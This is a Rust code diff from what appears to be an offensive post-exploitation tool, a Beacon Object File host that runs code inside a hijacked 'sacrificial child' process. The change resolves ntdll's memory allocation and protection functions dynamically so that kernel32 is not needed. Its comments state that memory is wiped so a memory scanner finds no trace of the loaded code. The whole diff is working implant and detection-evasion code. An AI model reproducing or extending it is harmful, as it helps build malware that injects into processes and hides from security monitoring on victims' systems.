@@ -32,17 +32,89 @@ type VirtualAllocFn = unsafe extern "system" fn(*mut c_void, usize, u32, u32) ->
 type VirtualProtectFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
 type VirtualFreeFn = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
 
+/// The sacrificial child's loader never maps kernel32 (its main thread is
+/// hijacked before LdrpInitializeProcess runs), so the bof-host resolves
+/// everything from **ntdll** — the one image CreateProcessW always maps.
+/// These adapters keep the VirtualAlloc/Protect/Free call sites unchanged
+/// while executing the equivalent Nt* calls.
+type NtAllocVmFn = unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32, u32) -> i32;
+type NtProtectVmFn =
+    unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
+type NtFreeVmFn = unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32) -> i32;
+
+const CUR_PROC: usize = !0usize; // NtCurrentProcess
+
+unsafe extern "system" fn nt_alloc_adapter(
+    addr: *mut c_void,
+    size: usize,
+    alloc_type: u32,
+    protect: u32,
+) -> *mut c_void {
+    let f: NtAllocVmFn = unsafe {
+        core::mem::transmute::<usize, NtAllocVmFn>(
+            crate::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory").unwrap_or(0),
+        )
+    };
+    let mut base = addr;
+    let mut sz = size;
+    let st = unsafe { f(CUR_PROC, &mut base, &mut sz, alloc_type, protect) };
+    if st < 0 {
+        core::ptr::null_mut()
+    } else {
+        base
+    }
+}
+
+unsafe extern "system" fn nt_protect_adapter(
+    addr: *mut c_void,
+    size: usize,
+    new_protect: u32,
+    old_protect: *mut u32,
+) -> i32 {
+    let f: NtProtectVmFn = unsafe {
+        core::mem::transmute::<usize, NtProtectVmFn>(
+            crate::export_addr(b"ntdll.dll", b"NtProtectVirtualMemory").unwrap_or(0),
+        )
+    };
+    let mut base = addr;
+    let mut sz = size;
+    let st = unsafe { f(CUR_PROC, &mut base, &mut sz, new_protect, old_protect) };
+    if st >= 0 {
+        1
+    } else {
+        0
+    }
+}
+
+unsafe extern "system" fn nt_free_adapter(addr: *mut c_void, size: usize, free_type: u32) -> i32 {
+    let f: NtFreeVmFn = unsafe {
+        core::mem::transmute::<usize, NtFreeVmFn>(
+            crate::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory").unwrap_or(0),
+        )
+    };
+    let mut base = addr;
+    let mut sz = size;
+    let st = unsafe { f(CUR_PROC, &mut base, &mut sz, free_type) };
+    if st >= 0 {
+        1
+    } else {
+        0
+    }
+}
+
 unsafe fn virtual_alloc() -> Option<VirtualAllocFn> {
-    let a = unsafe { crate::export_addr(b"kernel32.dll", b"VirtualAlloc") }?;
-    Some(unsafe { core::mem::transmute::<usize, VirtualAllocFn>(a) })
+    // Resolution failure = catastrophic (no ntdll): the adapter's transmute
+    // of a null address would crash — gate on the export resolving first.
+    crate::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory")?;
+    Some(nt_alloc_adapter as VirtualAllocFn)
 }
 unsafe fn virtual_protect() -> Option<VirtualProtectFn> {
-    let a = unsafe { crate::export_addr(b"kernel32.dll", b"VirtualProtect") }?;
-    Some(unsafe { core::mem::transmute::<usize, VirtualProtectFn>(a) })
+    crate::export_addr(b"ntdll.dll", b"NtProtectVirtualMemory")?;
+    Some(nt_protect_adapter as VirtualProtectFn)
 }
 unsafe fn virtual_free() -> Option<VirtualFreeFn> {
-    let a = unsafe { crate::export_addr(b"kernel32.dll", b"VirtualFree") }?;
-    Some(unsafe { core::mem::transmute::<usize, VirtualFreeFn>(a) })
+    crate::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory")?;
+    Some(nt_free_adapter as VirtualFreeFn)
 }
 
 fn page(n: usize) -> usize {
@@ -163,7 +235,7 @@ impl Drop for SectionGuard {
 /// Fill a region with zeros (RtlZeroMemory when resolvable, else a hand-rolled
 /// loop) — no relocated BOF bytes survive for a memory scanner.
 unsafe fn zero_region(p: *mut c_void, len: usize) {
-    if let Some(addr) = unsafe { crate::export_addr(b"kernel32.dll", b"RtlZeroMemory") } {
+    if let Some(addr) = unsafe { crate::export_addr(b"ntdll.dll", b"RtlZeroMemory") } {
         type RtlZero = unsafe extern "system" fn(*mut c_void, usize);
         let f: RtlZero = unsafe { core::mem::transmute(addr) };
         unsafe { f(p, len) };
